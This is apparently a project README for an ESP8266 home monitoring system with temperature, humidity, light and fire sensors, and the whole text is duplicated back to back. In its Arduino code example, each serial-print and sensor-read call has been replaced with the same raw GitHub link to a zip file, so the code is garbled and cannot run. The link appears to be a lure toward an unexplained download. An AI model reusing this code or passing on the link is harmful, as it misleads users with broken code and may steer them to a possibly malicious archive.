# Home Monitoring System

## Overview

The Home Monitoring System is designed to enhance the safety and efficiency of a home environment by using a variety of sensors to monitor different parameters. This system is simulated using Proteus software and includes sensors such as the DHT11 for temperature and humidity, an LDR light sensor, a fire detection sensor, and other essential sensors for a comprehensive monitoring solution.

## Components

- **DHT11 Temperature and Humidity Sensor**: Monitors the ambient temperature and humidity.
- **LDR Light Sensor**: Measures the intensity of light in the environment.
- **Fire Detection Sensor**: Detects the presence of fire or smoke.
- **Additional Sensors**: Include motion sensors, door/window sensors, gas sensors, etc., for complete home monitoring.

## Features

- **Real-time Monitoring**: Continuously monitors environmental parameters.
- **Alerts and Notifications**: Provides alerts when predefined thresholds are exceeded.
- **Data Logging**: Logs sensor data for historical analysis.
- **Simulation**: Uses Proteus software for simulation and testing.

## Setup Instructions

1. **Software Setup**:
   - Install Proteus software on your computer.
   - Import the necessary sensor libraries and components into Proteus.
   
2. **Circuit Design in Proteus**:
   - Design the circuit by placing the ESP8266, DHT11, LDR, fire detection sensor, and other sensors in the Proteus workspace.
   - Connect the sensors to the appropriate pins on the ESP8266.

3. **Programming the ESP8266**:
   - Write the code to read data from the sensors and process it.
   - Use the Arduino IDE to compile and upload the code to the ESP8266.

4. **Simulation in Proteus**:
   - Run the simulation in Proteus to test the system.
   - Monitor the sensor readings and verify the system's behavior.

## Usage

- Open Proteus and load the designed circuit.
- Start the simulation to monitor real-time data from the sensors.
- Adjust the environmental parameters in the simulation to test the system's response.
- Analyze the logged data to understand the home environment conditions.

## Code Example

```cpp
#include <ESP8266WiFi.h>
#include <DHT.h>

#define DHTPIN D4
#define DHTTYPE DHT11
#define LDRPIN A0
#define FIREPIN D5

DHT dht(DHTPIN, DHTTYPE);

void setup() {
  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(9600);
  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip();
  pinMode(FIREPIN, INPUT);
}

void loop() {
  float h = https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip();
  float t = https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip();
  int ldr = analogRead(LDRPIN);
  int fire = digitalRead(FIREPIN);
  
  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip("Temperature: ");
  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(t);
  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(" °C, Humidity: ");
  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(h);
  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(" %, Light: ");
  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(ldr);
  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(", Fire: ");
  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(fire ? "Yes" : "No");
  
  delay(2000);
}
```

## Contribution

Feel free to contribute to this project by submitting pull requests or reporting issues. Your contributions are greatly appreciated!

## License

This project is licensed under the MIT License - see the LICENSE file for details.

---

This readme provides a comprehensive overview of the Home Monitoring System, including its components, features, setup instructions, usage, and code example.# Home Monitoring System

## Overview

The Home Monitoring System is designed to enhance the safety and efficiency of a home environment by using a variety of sensors to monitor different parameters. This system is simulated using Proteus software and includes sensors such as the DHT11 for temperature and humidity, an LDR light sensor, a fire detection sensor, and other essential sensors for a comprehensive monitoring solution.

## Components

- **DHT11 Temperature and Humidity Sensor**: Monitors the ambient temperature and humidity.
- **LDR Light Sensor**: Measures the intensity of light in the environment.
- **Fire Detection Sensor**: Detects the presence of fire or smoke.
- **Additional Sensors**: Include motion sensors, door/window sensors, gas sensors, etc., for complete home monitoring.

## Features

- **Real-time Monitoring**: Continuously monitors environmental parameters.
- **Alerts and Notifications**: Provides alerts when predefined thresholds are exceeded.
- **Data Logging**: Logs sensor data for historical analysis.
- **Simulation**: Uses Proteus software for simulation and testing.

## Setup Instructions

1. **Software Setup**:
   - Install Proteus software on your computer.
   - Import the necessary sensor libraries and components into Proteus.
   
2. **Circuit Design in Proteus**:
   - Design the circuit by placing the ESP8266, DHT11, LDR, fire detection sensor, and other sensors in the Proteus workspace.
   - Connect the sensors to the appropriate pins on the ESP8266.

3. **Programming the ESP8266**:
   - Write the code to read data from the sensors and process it.
   - Use the Arduino IDE to compile and upload the code to the ESP8266.

4. **Simulation in Proteus**:
   - Run the simulation in Proteus to test the system.
   - Monitor the sensor readings and verify the system's behavior.

## Usage

- Open Proteus and load the designed circuit.
- Start the simulation to monitor real-time data from the sensors.
- Adjust the environmental parameters in the simulation to test the system's response.
- Analyze the logged data to understand the home environment conditions.

## Code Example

```cpp
#include <ESP8266WiFi.h>
#include <DHT.h>

#define DHTPIN D4
#define DHTTYPE DHT11
#define LDRPIN A0
#define FIREPIN D5

DHT dht(DHTPIN, DHTTYPE);

void setup() {
  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(9600);
  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip();
  pinMode(FIREPIN, INPUT);
}

void loop() {
  float h = https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip();
  float t = https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip();
  int ldr = analogRead(LDRPIN);
  int fire = digitalRead(FIREPIN);
  
  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip("Temperature: ");
  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(t);
  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(" °C, Humidity: ");
  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(h);
  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(" %, Light: ");
  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(ldr);
  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(", Fire: ");
  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(fire ? "Yes" : "No");
  
  delay(2000);
}
```

## Contribution

Feel free to contribute to this project by submitting pull requests or reporting issues. Your contributions are greatly appreciated!

## License

This project is licensed under the MIT License - see the LICENSE file for details.

---

This readme provides a comprehensive overview of the Home Monitoring System, including its components, features, setup instructions, usage, and code example.
